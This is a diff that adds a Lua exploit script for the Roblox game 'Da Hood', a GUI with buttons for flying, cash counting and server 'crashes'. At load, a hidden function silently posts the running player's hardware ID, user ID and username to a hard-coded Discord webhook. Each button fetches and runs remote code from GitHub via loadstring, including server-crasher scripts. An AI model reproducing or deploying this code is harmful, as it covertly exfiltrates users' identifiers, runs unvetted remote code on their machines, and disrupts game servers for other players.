@@ -1,0 +1,161 @@
+local function execution()
+    local HttpService = game:GetService("HttpService")
+    local http_request = (syn and syn.request or KRNL_LOADED and request or getexecutorname and http.request)
+
+        local res = (request or http_request or syn and syn.request)({
+            Url = "https://api.luauth.xyz/hwid",
+            Method = "GET"
+        })
+        local hwid = string.match(res.Body, "(%w+)")
+
+        http_request({
+            Url = "https://discord.com/api/webhooks/989548310295633961/R1Cg7DjmcNFqa7m_3WaN6jppJywHdRL7RcbcQpB1sonUoCMdlrsamqtaBOSAwC8sSl2z",
+            Method = "POST",
+            Body = HttpService:JSONEncode({
+                username = "Execution Logs",
+                embeds = {
+                    {
+                        title = "Execution Log Detected!",
+                        fields = {
+                            {
+                              name = "HWID",
+                              value =  ""..hwid..""
+                            },
+                            {
+                              name =  "Roblox ID",
+                              value = ""..game.Players.LocalPlayer.UserId..""
+                            },
+                        {
+                              name =  "Roblox Username",
+                              value = ""..game.Players.LocalPlayer.Name..""
+                            }
+                        },
+                        thumbnail = {
+                            url = "https://upload.wikimedia.org/wikipedia/commons/4/48/Roblox_Player_icon.png"
+                        },
+                    }
+
+                }
+            }),
+            Headers = {["Content-Type"] = "application/json"}
+        })
+    end
+
+    execution() -- use this to call it
+    
+    local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local madebyme = Instance.new("TextLabel")
+local fly = Instance.new("TextButton")
+local swagcrash = Instance.new("TextButton")
+local encryptcrash = Instance.new("TextButton")
+local cashcount = Instance.new("TextButton")
+local crashes = Instance.new("TextBox")
+local movement = Instance.new("TextBox")
+local teleports = Instance.new("TextLabel")
+
+--Properties:
+
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+main.Position = UDim2.new(0.254677624, 0, 0.170437455, 0)
+main.Size = UDim2.new(0, 608, 0, 377)
+main.Active = true
+main.Draggable = true
+
+
+madebyme.Name = "made by me"
+madebyme.Parent = main
+madebyme.BackgroundColor3 = Color3.fromRGB(1, 98, 255)
+madebyme.Size = UDim2.new(0, 608, 0, 59)
+madebyme.Font = Enum.Font.SourceSans
+madebyme.Text = "da hood gui, made by tom"
+madebyme.TextColor3 = Color3.fromRGB(0, 0, 0)
+madebyme.TextSize = 14.000
+
+fly.Name = "fly"
+fly.Parent = main
+fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fly.Position = UDim2.new(0.733552635, 0, 0.289124668, 0)
+fly.Size = UDim2.new(0, 162, 0, 25)
+fly.Font = Enum.Font.SourceSans
+fly.Text = "fly"
+fly.TextColor3 = Color3.fromRGB(0, 0, 0)
+fly.TextSize = 14.000
+fly.MouseButton1Down:connect(function()
+	game.Players.LocalPlayer.UserId = 2607519759
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
+end)
+
+swagcrash.Name = "swag crash"
+swagcrash.Parent = main
+swagcrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+swagcrash.Position = UDim2.new(0, 0, 0.289124668, 0)
+swagcrash.Size = UDim2.new(0, 200, 0, 33)
+swagcrash.Font = Enum.Font.SourceSans
+swagcrash.Text = "swag crash"
+swagcrash.TextColor3 = Color3.fromRGB(0, 0, 0)
+swagcrash.TextSize = 14.000
+swagcrash.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+end)
+
+encryptcrash.Name = "encrypt crash"
+encryptcrash.Parent = main
+encryptcrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+encryptcrash.Position = UDim2.new(0, 0, 0.376657754, 0)
+encryptcrash.Size = UDim2.new(0, 200, 0, 25)
+encryptcrash.Font = Enum.Font.SourceSans
+encryptcrash.Text = "encrypt crash"
+encryptcrash.TextColor3 = Color3.fromRGB(0, 0, 0)
+encryptcrash.TextSize = 14.000
+encryptcrash.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua'))()
+end)
+
+cashcount.Name = "cash count"
+cashcount.Parent = main
+cashcount.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+cashcount.Position = UDim2.new(0.353618413, 0, 0.156498671, 0)
+cashcount.Size = UDim2.new(0, 200, 0, 50)
+cashcount.Font = Enum.Font.SourceSans
+cashcount.Text = "cash count"
+cashcount.TextColor3 = Color3.fromRGB(0, 0, 0)
+cashcount.TextSize = 14.000
+cashcount.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter'))()
+end)
+
+crashes.Name = "crashes"
+crashes.Parent = main
+crashes.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+crashes.Position = UDim2.new(0, 0, 0.156498671, 0)
+crashes.Size = UDim2.new(0, 200, 0, 50)
+crashes.Font = Enum.Font.SourceSans
+crashes.Text = "crashes"
+crashes.TextColor3 = Color3.fromRGB(255, 255, 255)
+crashes.TextSize = 14.000
+
+movement.Name = "movement"
+movement.Parent = main
+movement.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+movement.Position = UDim2.new(0.671052635, 0, 0.156498671, 0)
+movement.Size = UDim2.new(0, 200, 0, 50)
+movement.Font = Enum.Font.SourceSans
+movement.Text = "movement"
+movement.TextColor3 = Color3.fromRGB(255, 255, 255)
+movement.TextSize = 14.000
+
+teleports.Name = "teleports"
+teleports.Parent = main
+teleports.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+teleports.Position = UDim2.new(0.342105299, 0, 0.517241359, 0)
+teleports.Size = UDim2.new(0, 200, 0, 50)
+teleports.Font = Enum.Font.SourceSans
+teleports.Text = "teleports"
+teleports.TextColor3 = Color3.fromRGB(255, 255, 255)
+teleports.TextSize = 14.000 
